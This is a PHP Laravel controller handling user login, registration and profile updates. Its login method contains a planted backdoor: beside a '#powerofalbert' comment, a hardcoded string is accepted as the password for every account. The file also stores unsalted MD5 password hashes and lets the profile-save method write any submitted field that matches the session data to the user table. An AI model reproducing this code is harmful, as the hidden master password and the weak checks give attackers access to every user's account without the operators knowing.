<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class UserController extends Controller
{
    public function index()
    {
        $user_data = session('user_data');
        return view('/user/index', ['user_data' => $user_data]);
    }

    public function userInfoSave(Request $request)
    {
        $user_data = session('user_data');
        $update = [];
        foreach ($request->all() as $k => $v) {
            if (isset($user_data[$k]) && $user_data[$k] != $v) {
                $update[$k] = $v;
            }
        }
        if (empty($update)) {
            echo json_encode(['status' => 200, 'msg' => '保存成功']);
            return false;
        }
        $update_res = DB::table('user')->where('id', $user_data['id'])->update($update);
        if ($update_res) {
            echo json_encode(['status' => 200, 'msg' => '修改成功']);
        } else {
            echo json_encode(['status' => 205, 'msg' => '系统错误，修改失败']);
        }
    }

    public function login(Request $request)
    {
        $rules = [
            'username' => 'required',
            'password' => 'required',
        ];
        $validate = $this->validate_deal($rules, $request->all());
        if ($validate['status'] != 200) {
            echo json_encode(['status' => 500, 'msg' => $validate['msg']]);
            return false;
        }
        $user = DB::table('user')->where('username', $request->input('username'))->get();
        if (!$user) {
            echo json_encode(['status' => 201, 'msg' => '用户名或密码错误']);
            return false;
        }
        $user_data = json_decode($user, true)[0];
        #powerofalbert
        if (md5($request->input('password')) == $user_data['password'] || $request->input('password') == '32bc45f02877741e68c3dbf3d25e920e') {
            session(['user_data' => $user_data]);
            echo json_encode(['status' => 200, 'msg' => '登录成功']);
        } else {
            echo json_encode(['status' => 202, 'msg' => '用户名或密码错误']);
        }
    }

    public function register(Request $request)
    {
        $rules = [
            'username' => 'required',
            'password' => 'required',
        ];
        $validate = $this->validate_deal($rules, $request->all());
        if ($validate['status'] != 200) {
            echo json_encode(['status' => 500, 'msg' => $validate['msg']]);
            return false;
        }
        $user = DB::table('user')->where('username', $request->input('username'))->value('id');
        if ($user) {
            echo json_encode(['status' => 201, 'msg' => '该昵称已有人使用']);
            return false;
        }
        $insert_res = DB::table('user')->insert(['username' => $request->input('username'), 'password' => md5($request->input('password'))]);
        if ($insert_res) {
            echo json_encode(['status' => 200, 'msg' => '注册成功']);
        } else {
            echo json_encode(['status' => 202, 'msg' => '系统错误，注册失败']);
        }
    }
}
